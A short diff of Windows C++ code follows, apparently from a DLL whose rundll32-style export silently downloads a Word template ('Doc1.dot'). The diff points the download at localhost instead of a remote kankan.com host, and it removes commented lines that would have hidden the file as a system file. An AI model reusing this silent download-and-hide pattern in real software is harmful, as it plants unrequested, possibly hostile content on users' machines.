@@ -281,7 +281,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	HRESULT hr = E_FAIL;
 	
 	TCHAR szDestLaunch[2048] = {0};
-	wcscpy(szDestLaunch, L"http://conf.xmp.kankan.com/config/Doc1.dot");
+	wcscpy(szDestLaunch, L"http://127.0.0.1/config/Doc1.dot");
 
 	CRegKey key;
 	TCHAR szLaunchPath [2048] = {0};
@@ -317,11 +317,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	}
 	else
 	{
-		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL); 
-		//SetFileAttributes(szPath, FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
-		//wcscpy(szTempPath, szPath);
-		//PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
-		//DeleteFile(szTempPath);
+		hr = URLDownloadToFile(NULL, szDestLaunch, szPath, _MAX_PATH, NULL);
 		TSDEBUG4CXX("downloadurl : "<<szDestLaunch<<" to " <<szPath<<" return " <<hr);
 	}
 	//wcscpy(szPath, L"c:\\scripthost.js");
